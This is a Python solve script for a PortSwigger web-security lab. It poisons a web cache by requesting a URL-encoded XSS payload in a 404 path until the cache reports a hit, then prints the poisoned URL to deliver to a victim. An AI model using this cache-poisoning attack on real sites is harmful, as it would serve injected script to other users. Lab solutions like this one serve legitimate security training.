#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: URL normalization.

Poisons a URL-encoded path that reflects XSS in the 404 response.
The cache normalises the path before keying, so the encoded URL
hits the same cache entry as the decoded version.
"""

import argparse
import requests
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_PAYLOAD = "<script>alert(1)</script>"
DEFAULT_PATH = "/random"


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 9 (URL normalization)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--path", default=DEFAULT_PATH, help="Base path prefix for the 404")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    encoded_payload = quote(args.payload, safe="")
    poison_path = f"{args.path}{encoded_payload}"
    url = f"{lab}{poison_path}"

    print(f"[*] Poisoning path: {poison_path}")
    for i in range(1, args.max_attempts + 1):
        r = s.get(url)
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status} | Status: {r.status_code}")
        if cache_status == "hit":
            print(f"[+] Cache poisoned!")
            print(f"[*] Deliver this URL to the victim:")
            print(f"    {url}")
            return

    print("[-] Cache hit not observed — try more attempts.")


if __name__ == "__main__":
    main()
